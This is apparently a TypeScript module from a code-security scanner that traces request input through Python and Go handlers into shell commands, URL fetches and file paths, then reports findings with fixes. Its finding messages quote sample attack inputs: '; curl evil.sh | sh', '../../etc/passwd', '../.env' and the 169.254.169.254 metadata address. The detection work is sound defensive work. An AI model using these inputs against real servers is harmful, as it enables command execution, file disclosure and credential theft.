/**
 * Intra-function data flow for Python and Go request handlers (FLOW-xx, Rule IDs 29501-29599).
 *
 * The line rules catch a request value used directly in a sink; these follow it through assignments in the
 * same function (`host = request.args.get('h')` -> `cmd = 'ping ' + host` -> `os.system(cmd)`), stop at
 * sanitizers (int(), secure_filename, filepath.Base, strconv.Atoi ...) and respect obvious guards
 * (an allow-list check for URLs, a prefix check for paths). See tests/rules/fixtures/py-go-flow.ts.
 */
import type { Finding } from '@/data/schema';
import type { CodeFile } from '../scanner-engine';

interface Hit { ruleId: number; code: string; title: string; severity: Finding['severity']; category: string; line: number; why: string; fix: string }
interface Fn { start: number; end: number; params: string[]; isHandler: boolean }

type Sink = 'cmd' | 'ssrf' | 'path';

const SINK_META: Record<'py' | 'go', Record<Sink, Omit<Hit, 'line' | 'why'> & { why: string }>> = {
  py: {
    cmd: { ruleId: 29501, code: 'FLOW-01', severity: 'CRITICAL', category: 'Command Injection', title: 'Request Input Reaches a Shell Command (Python)',
      why: 'reaches a shell, so `; curl evil.sh | sh` in the input runs on the server', fix: 'Pass an argument list without shell=True (subprocess.run(["ping", "-c", "1", host])) and validate the value against an allow-list.' },
    ssrf: { ruleId: 29502, code: 'FLOW-02', severity: 'HIGH', category: 'Server-Side Request Forgery', title: 'Request Input Chooses the URL the Server Fetches (Python)',
      why: 'becomes the URL the server requests, so callers can reach internal services and cloud metadata (169.254.169.254)', fix: 'Fetch only allow-listed hosts: parse the URL, compare urlparse(url).hostname with a fixed set, and block private IP ranges.' },
    path: { ruleId: 29503, code: 'FLOW-03', severity: 'HIGH', category: 'Path Traversal', title: 'Request Input Builds a File Path (Python)',
      why: 'builds a file path, so `../../etc/passwd` or `../.env` reads files outside the intended folder', fix: 'Use send_from_directory / werkzeug.utils.safe_join, or secure_filename() the name and check os.path.realpath(path).startswith(BASE_DIR).' },
  },
  go: {
    cmd: { ruleId: 29504, code: 'FLOW-04', severity: 'CRITICAL', category: 'Command Injection', title: 'Request Input Reaches a Shell Command (Go)',
      why: 'reaches `sh -c` (or chooses the program), so shell metacharacters in the input run commands on the server', fix: 'Call exec.Command with a fixed program and the value as its own argument (exec.Command("ping", "-c", "1", host)); never build a `sh -c` string.' },
    ssrf: { ruleId: 29505, code: 'FLOW-05', severity: 'HIGH', category: 'Server-Side Request Forgery', title: 'Request Input Chooses the URL the Server Fetches (Go)',
      why: 'becomes the URL the server requests, so callers can reach internal services and cloud metadata (169.254.169.254)', fix: 'Parse the URL, check u.Hostname() against an allow-list and reject private addresses before calling http.Get / NewRequest.' },
    path: { ruleId: 29506, code: 'FLOW-06', severity: 'HIGH', category: 'Path Traversal', title: 'Request Input Builds a File Path (Go)',
      why: 'builds a file path, so `../../etc/passwd` reads files outside the intended folder (filepath.Join does not stop `..`)', fix: 'Reduce the name with filepath.Base, or Clean the joined path and require strings.HasPrefix(p, baseDir+string(os.PathSeparator)).' },
  },
};

const wordIn = (name: string, text: string) => new RegExp(String.raw`(?<![\w.])${name.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}(?!\w)`).test(text);

// ---------------- Python ----------------

const PY_SOURCE = /\brequest\.(?:args|form|values|json|files|cookies|headers|GET|POST|data|body|query_params|path_params)\b|\brequest\.get_json\s*\(/;
const PY_SANITIZER = /\b(?:int|float|bool|uuid\.UUID|UUID|secure_filename|os\.path\.basename|basename|shlex\.quote|quote)\s*\(/;
const PY_ROUTE_DECORATOR = /^\s*@\w+(?:\.\w+)*\.(?:route|get|post|put|patch|delete|api_route|websocket)\s*\(/;
const PY_NON_INPUT_PARAM = /^(?:self|cls|request|req|db|session|background_tasks|response|current_user|user)$|Depends\(|Request\b|Session\b|BackgroundTasks\b/;

function pyFunctions(lines: string[]): Fn[] {
  const fns: Fn[] = [];
  lines.forEach((l, i) => {
    const m = /^(\s*)(?:async\s+)?def\s+\w+\s*\((.*)/.exec(l);
    if (!m) return;
    const indent = m[1].length;
    // Parameters can span lines until the closing "):"
    let sig = m[2];
    let j = i;
    while (!/\)\s*(?:->[^:]*)?:\s*(?:#.*)?$/.test(sig) && j + 1 < lines.length && j - i < 15) sig += ' ' + lines[++j];
    let end = j + 1;
    while (end < lines.length && (!lines[end].trim() || lines[end].length - lines[end].trimStart().length > indent)) end++;
    let k = i - 1;
    let decorated = false;
    while (k >= 0 && /^\s*@/.test(lines[k])) { if (PY_ROUTE_DECORATOR.test(lines[k])) decorated = true; k--; }
    const rawParams = sig.slice(0, sig.lastIndexOf(')')).split(',').map((p) => p.trim()).filter(Boolean);
    const params = decorated
      ? rawParams.filter((p) => !/^\*/.test(p) && !PY_NON_INPUT_PARAM.test(p.split(/[:=]/)[0].trim()) && !PY_NON_INPUT_PARAM.test(p))
          .map((p) => p.split(/[:=]/)[0].trim())
      : [];
    const usesRequest = /\brequest\b/.test(rawParams.join(',')) || lines.slice(j + 1, end).some((x) => PY_SOURCE.test(x));
    fns.push({ start: j + 1, end, params, isHandler: decorated || usesRequest });
  });
  return fns;
}

function pySinkArg(l: string): { sink: Sink; arg: string } | null {
  let m = /\bos\.(?:system|popen)\s*\(([^)]*)/.exec(l);
  if (m) return { sink: 'cmd', arg: m[1] };
  m = /\bsubprocess\.(?:run|call|check_call|check_output|Popen|getoutput|getstatusoutput)\s*\(([^\n]*)/.exec(l);
  if (m && (/shell\s*=\s*True/.test(l) || /getoutput|getstatusoutput/.test(l))) return { sink: 'cmd', arg: m[1].split(/,\s*(?:shell|check|capture_output|text|timeout)\s*=/)[0] };
  // Only HTTP libraries: an ORM session.get(Model, id) is not a URL fetch
  m = /\b(?:requests|httpx)\.(?:get|post|put|patch|delete|head|request|stream)\s*\(([^)]*)/.exec(l);
  if (m) return { sink: 'ssrf', arg: m[1].split(/,\s*\w+\s*=/)[0] };
  m = /\burllib\.request\.urlopen\s*\(([^)]*)/.exec(l) || /\burlopen\s*\(([^)]*)/.exec(l);
  if (m) return { sink: 'ssrf', arg: m[1] };
  m = /(?<![\w.])(?:open|send_file|os\.remove|os\.unlink|shutil\.rmtree|shutil\.copy\w*|FileResponse)\s*\(([^)]*)/.exec(l);
  if (m) return { sink: 'path', arg: m[1].split(/,\s*(?:['"][rwabxt+]{1,3}['"]|mode\s*=|encoding\s*=)/)[0] };
  return null;
}

function analyzePython(lines: string[]): Array<{ sink: Sink; line: number; variable: string }> {
  const out: Array<{ sink: Sink; line: number; variable: string }> = [];
  for (const fn of pyFunctions(lines)) {
    if (!fn.isHandler) continue;
    const body = lines.slice(fn.start, fn.end).map((l) => l.replace(/(^|\s)#.*$/, ''));
    const tainted = new Set(fn.params);
    const isTainted = (expr: string) => PY_SOURCE.test(expr) || [...tainted].some((v) => wordIn(v, expr));
    const guards = body.join('\n');
    body.forEach((l, idx) => {
      const assign = /^\s*([A-Za-z_]\w*)\s*(?::[^=]+)?(\+?=)(?!=)\s*(.+)$/.exec(l);
      if (assign) {
        const [, name, op, expr] = assign;
        if (isTainted(expr) && !PY_SANITIZER.test(expr)) tainted.add(name);
        else if (op === '=') tainted.delete(name);
      }
      const s = pySinkArg(l);
      if (!s || !isTainted(s.arg) || PY_SANITIZER.test(s.arg)) return;
      if (s.sink === 'ssrf' && /allow|whitelist|ALLOWED|is_safe_url|validate_url|hostname\s+(?:not\s+)?in\b/i.test(guards)) return;
      if (s.sink === 'path' && (/safe_join|secure_filename|\.startswith\s*\(|commonpath|is_relative_to/.test(guards))) return;
      const variable = [...tainted].find((v) => wordIn(v, s.arg)) ?? 'request input';
      out.push({ sink: s.sink, line: fn.start + idx, variable });
    });
  }
  return out;
}

// ---------------- Go ----------------

const GO_SOURCE = /\br\.URL\.Query\(\)\.Get\(|\.(?:FormValue|PostFormValue)\(|\br\.Header\.Get\(|\bmux\.Vars\(\w+\)\[|\bchi\.URLParam\(|\bc\.(?:Query|DefaultQuery|Param|PostForm|DefaultPostForm|GetHeader|QueryParam|FormValue|Params|Get)\(/;
const GO_SANITIZER = /\b(?:strconv\.(?:Atoi|ParseInt|ParseUint|ParseFloat|ParseBool)|filepath\.Base|path\.Base|uuid\.Parse|url\.QueryEscape)\s*\(/;
const GO_HANDLER_PARAM = /\*http\.Request|\*gin\.Context|echo\.Context|\*fiber\.Ctx/;

function goFunctions(lines: string[]): Fn[] {
  const fns: Fn[] = [];
  lines.forEach((l, i) => {
    const m = /^\s*func\s*(?:\([^)]*\)\s*)?\w*\s*\(([^)]*)\)/.exec(l);
    if (!m || !l.includes('{')) return;
    let depth = 0;
    let end = i;
    for (; end < lines.length; end++) {
      depth += (lines[end].match(/\{/g) || []).length - (lines[end].match(/\}/g) || []).length;
      if (depth <= 0 && end > i) break;
      if (depth <= 0 && end === i && lines[end].includes('}')) break;
    }
    fns.push({ start: i + 1, end: Math.min(end, lines.length), params: [], isHandler: GO_HANDLER_PARAM.test(m[1]) });
  });
  return fns;
}

function goSinkArg(l: string): { sink: Sink; arg: string } | null {
  let m = /\bexec\.Command(?:Context)?\s*\(([^\n]*)\)/.exec(l);
  if (m) {
    const args = m[1].replace(/^ctx\s*,\s*/, '');
    const shell = /^\s*"(?:\/bin\/)?(?:ba)?sh"\s*,\s*"-c"\s*,\s*(.+)$/.exec(args);
    if (shell) return { sink: 'cmd', arg: shell[1] };
    return { sink: 'cmd', arg: args.split(',')[0] };
  }
  m = /\b(?:http|client|\w*[Cc]lient)\.(?:Get|Post|Head|PostForm)\s*\(([^,)]*)/.exec(l);
  if (m) return { sink: 'ssrf', arg: m[1] };
  m = /\bhttp\.NewRequest(?:WithContext)?\s*\((?:[^,]+,\s*)?[^,]+,\s*([^,)]*)/.exec(l);
  if (m) return { sink: 'ssrf', arg: m[1] };
  m = /\b(?:os\.(?:Open|OpenFile|ReadFile|Create|WriteFile|Remove|RemoveAll)|ioutil\.ReadFile|c\.File|c\.SendFile)\s*\(([^,)]*)/.exec(l);
  if (m) return { sink: 'path', arg: m[1] };
  m = /\bhttp\.ServeFile\s*\([^,]+,[^,]+,\s*([^)]*)/.exec(l);
  if (m) return { sink: 'path', arg: m[1] };
  return null;
}

function analyzeGo(lines: string[]): Array<{ sink: Sink; line: number; variable: string }> {
  const out: Array<{ sink: Sink; line: number; variable: string }> = [];
  for (const fn of goFunctions(lines)) {
    if (!fn.isHandler) continue;
    const body = lines.slice(fn.start, fn.end).map((l) => l.replace(/\/\/.*$/, ''));
    const tainted = new Set<string>();
    const isTainted = (expr: string) => GO_SOURCE.test(expr) || [...tainted].some((v) => wordIn(v, expr));
    const guards = body.join('\n');
    body.forEach((l, idx) => {
      const assign = /^\s*(?:var\s+)?([A-Za-z_]\w*(?:\s*,\s*[A-Za-z_]\w*)*)\s*(?:\w+\s*)?(:=|=)\s*(.+)$/.exec(l);
      if (assign && !/^\s*(?:if|for|switch)\b/.test(l)) {
        const names = assign[1].split(',').map((n) => n.trim()).filter((n) => n !== '_' && n !== 'err');
        const expr = assign[3];
        // `n, err := strconv.Atoi(x)` clears the taint: the value is a number now
        if (isTainted(expr) && !GO_SANITIZER.test(expr)) names.forEach((n) => tainted.add(n));
        else names.forEach((n) => tainted.delete(n));
      }
      const s = goSinkArg(l);
      if (!s || !isTainted(s.arg) || GO_SANITIZER.test(s.arg)) return;
      if (s.sink === 'ssrf' && /allow|whitelist|Allowed|isSafeURL|validateURL|Hostname\(\)\s*(?:!=|==)|net\.ParseIP|IsPrivate\(\)/i.test(guards)) return;
      if (s.sink === 'path' && /strings\.HasPrefix\s*\(|filepath\.Rel\s*\(|securejoin|SecureJoin/.test(guards)) return;
      const variable = [...tainted].find((v) => wordIn(v, s.arg)) ?? 'request input';
      out.push({ sink: s.sink, line: fn.start + idx, variable });
    });
  }
  return out;
}

// ---------------- engine ----------------

export function evaluatePyGoFlowRules(file: CodeFile, lines: string[], cleanContent: string, findingCounter: {
  count: number;
}): { findings: Finding[]; logs: string[] } {
  const findings: Finding[] = [];
  const logs: string[] = [];
  const path = file.path.toLowerCase().replace(/\\/g, '/');
  const lang = path.endsWith('.py') ? 'py' : path.endsWith('.go') ? 'go' : null;
  if (!lang || /(?:^|\/)(?:tests?|__tests__|testdata|fixtures?)\//.test(path) || /_test\.go$|(?:^|\/)test_[^/]*\.py$/.test(path)) return { findings, logs };
  if (lang === 'py' ? !/\brequest\b|@\w+(?:\.\w+)*\.(?:get|post|put|patch|delete|route)\s*\(/.test(cleanContent) : !GO_HANDLER_PARAM.test(cleanContent)) return { findings, logs };

  const raw = (file.content || '').split('\n');
  const flows = lang === 'py' ? analyzePython(raw) : analyzeGo(raw);
  const seen = new Set<string>();
  const hits: Hit[] = [];
  for (const f of flows) {
    const key = `${f.sink}:${f.line}`;
    if (seen.has(key)) continue;
    seen.add(key);
    const meta = SINK_META[lang][f.sink];
    hits.push({ ...meta, line: f.line, why: `Request input (\`${f.variable}\`) ${meta.why}.` });
  }

  const ts = new Date().toLocaleTimeString();
  for (const h of hits) {
    const lineNum = h.line + 1;
    findings.push({
      id: `flow${h.ruleId}-${Date.now()}-${findingCounter.count++}`,
      ruleId: h.ruleId,
      type: 'SECURITY',
      title: `${h.code}: ${h.title}`,
      severity: h.severity,
      category: h.category,
      filePath: file.path,
      lineRange: `L${lineNum}`,
      snippet: (raw[h.line] || '').trim(),
      reproductionSteps: [`Scanned ${file.path}:${lineNum}.`, h.why],
      remediationPrompt: `${h.fix} (${file.path}:${lineNum})`,
      status: 'OPEN',
      owner: 'Security Lead',
      falsePositive: false
    });
    logs.push(`[${ts}] [FLOW] ${h.severity}: ${h.code} ${h.title} at ${file.path}:${lineNum}`);
  }
  return { findings, logs };
}
